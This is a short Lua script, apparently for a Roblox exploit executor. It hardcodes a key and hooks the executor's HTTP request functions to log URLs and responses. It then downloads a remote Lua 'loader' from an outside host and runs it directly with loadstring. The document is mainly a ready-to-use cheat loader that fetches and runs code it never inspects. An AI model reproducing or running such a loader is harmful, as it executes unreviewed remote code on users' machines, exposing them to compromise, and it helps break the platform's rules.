ACTIVE_KEY = "5c4965bbf469ca914edb8395bd5a2b50"

local oldRequest = http_request or request or (syn and syn.request)
assert(oldRequest, "request not supported")

local function debugRequest(opt)
    local url = opt.Url or opt.url or "unknown"

    print("[HTTP] ->", url)

    local res = oldRequest(opt)

    if type(res) == "table" then
        local status = res.StatusCode or res.Status or "?"

        print("[HTTP] <-", status, url)

        if tonumber(status) == 403 then
            warn("[HTTP 403 URL]", url)
            warn("[HTTP 403 BODY]", tostring(res.Body or res.body))
        end
    end

    return res
end

getgenv().request = debugRequest
getgenv().http_request = debugRequest

local res = oldRequest({
    Url = "https://api.imt-hub.xyz/files/v2/loaders/6mss1famhjy2gasnw5w481j8b9yr42ji.lua",
    Method = "GET"
})

local src = type(res) == "table" and (res.Body or res.body) or res

assert(type(src) == "string", "Loader response invalid")

local fn, err = loadstring(src)

assert(fn, tostring(err))

fn()
